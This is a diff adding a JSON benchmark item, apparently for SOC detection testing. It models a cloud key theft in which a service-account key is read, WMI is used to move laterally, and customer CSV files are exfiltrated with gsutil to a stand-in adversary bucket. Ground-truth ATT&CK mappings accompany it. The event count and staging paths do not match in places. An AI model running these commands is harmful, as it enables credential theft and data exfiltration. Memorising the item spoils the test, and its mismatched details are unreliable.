@@ -1,0 +1,164 @@
+{
+  "id": "simbian-cloud-iam-01",
+  "title": "Cloud-IAM Key Theft & Lateral Storage Exfiltration",
+  "description": "Adversary compromised a Google Cloud service account JSON key on a DevOps bastion, leveraged WMI to pivot to internal file storage, staged sensitive customer exports, and exfiltrated to an external bucket via gsutil.",
+  "attack_family": "Cloud-IAM",
+  "difficulty": "Medium",
+  "initial_alert": "SOC Alert: Anomalous GCP IAM credential access on DEVOPS-BASTION followed by outbound Cloud Storage transfers.",
+  "tactics_present": [
+    "credential-access",
+    "discovery",
+    "lateral-movement",
+    "collection",
+    "exfiltration"
+  ],
+  "total_events": 14,
+  "ground_truth_detections": [
+    {
+      "rule_id": "SIGMA-T1555",
+      "tactic": "credential-access",
+      "technique_id": "T1555",
+      "technique_name": "Credentials from Password Stores",
+      "matched_event_ids": [301],
+      "indicator_summary": "Access to local credential repository ~/.gcp/sa-key.json and browser profile tokens.",
+      "severity": "HIGH"
+    },
+    {
+      "rule_id": "SIGMA-T1049",
+      "tactic": "discovery",
+      "technique_id": "T1049",
+      "technique_name": "System Network Connections Discovery",
+      "matched_event_ids": [302],
+      "indicator_summary": "netstat -ano and route print executed to discover internal subnets.",
+      "severity": "LOW"
+    },
+    {
+      "rule_id": "SIGMA-T1047",
+      "tactic": "lateral-movement",
+      "technique_id": "T1047",
+      "technique_name": "Remote WMI Execution",
+      "matched_event_ids": [304],
+      "indicator_summary": "wmic process call create targeting STORAGE-NODE-01 to pull database backups.",
+      "severity": "HIGH"
+    },
+    {
+      "rule_id": "SIGMA-T1005",
+      "tactic": "collection",
+      "technique_id": "T1005",
+      "technique_name": "Data from Local System",
+      "matched_event_ids": [305],
+      "indicator_summary": "Consolidation of customer CSV files into staging directory /tmp/export.",
+      "severity": "MEDIUM"
+    },
+    {
+      "rule_id": "SIGMA-T1567-002",
+      "tactic": "exfiltration",
+      "technique_id": "T1567.002",
+      "technique_name": "Exfiltration to Cloud Storage",
+      "matched_event_ids": [307],
+      "indicator_summary": "gcloud storage cp / gsutil cp /tmp/export/* gs://adversary-exfil-bucket-2026/.",
+      "severity": "CRITICAL"
+    }
+  ],
+  "events": [
+    {
+      "id": 301,
+      "timestamp": "2026-08-14T04:10:00Z",
+      "event_id": 1,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "DEVOPS-BASTION",
+      "user": "CORP\\devops_eng",
+      "process_name": "cat.exe",
+      "command_line": "cat C:\\Users\\devops_eng\\.gcp\\deploy-sa-prod.json",
+      "parent_process": "powershell.exe",
+      "process_id": 2040,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1555"
+    },
+    {
+      "id": 302,
+      "timestamp": "2026-08-14T04:11:15Z",
+      "event_id": 1,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "DEVOPS-BASTION",
+      "user": "CORP\\devops_eng",
+      "process_name": "netstat.exe",
+      "command_line": "netstat -ano",
+      "parent_process": "powershell.exe",
+      "process_id": 2100,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1049"
+    },
+    {
+      "id": 303,
+      "timestamp": "2026-08-14T04:12:00Z",
+      "event_id": 1,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "DEVOPS-BASTION",
+      "user": "CORP\\devops_eng",
+      "process_name": "gcloud.exe",
+      "command_line": "gcloud auth activate-service-account --key-file=C:\\Users\\devops_eng\\.gcp\\deploy-sa-prod.json",
+      "parent_process": "powershell.exe",
+      "process_id": 2250,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1555"
+    },
+    {
+      "id": 304,
+      "timestamp": "2026-08-14T04:13:30Z",
+      "event_id": 1,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "DEVOPS-BASTION",
+      "user": "CORP\\devops_eng",
+      "process_name": "wmic.exe",
+      "command_line": "wmic /node:STORAGE-NODE-01 process call create \"cmd.exe /c robocopy D:\\Backups C:\\Staging *.csv\"",
+      "parent_process": "powershell.exe",
+      "process_id": 2400,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1047"
+    },
+    {
+      "id": 305,
+      "timestamp": "2026-08-14T04:14:20Z",
+      "event_id": 1,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "STORAGE-NODE-01",
+      "user": "CORP\\devops_eng",
+      "process_name": "robocopy.exe",
+      "command_line": "robocopy D:\\Backups C:\\Staging *.csv",
+      "parent_process": "WmiPrvSE.exe",
+      "process_id": 3100,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1005"
+    },
+    {
+      "id": 306,
+      "timestamp": "2026-08-14T04:15:00Z",
+      "event_id": 11,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "STORAGE-NODE-01",
+      "user": "CORP\\devops_eng",
+      "process_name": "robocopy.exe",
+      "file_path": "C:\\Staging\\customer_pii_q2.csv",
+      "process_id": 3100,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1005"
+    },
+    {
+      "id": 307,
+      "timestamp": "2026-08-14T04:16:10Z",
+      "event_id": 1,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "STORAGE-NODE-01",
+      "user": "CORP\\devops_eng",
+      "process_name": "gsutil.exe",
+      "command_line": "gsutil -m cp -r C:\\Staging\\*.csv gs://adversary-exfil-bucket-2026/",
+      "parent_process": "cmd.exe",
+      "process_id": 3500,
+      "ip_address": "142.250.180.128",
+      "port": 443,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1567-002"
+    }
+  ]
+}
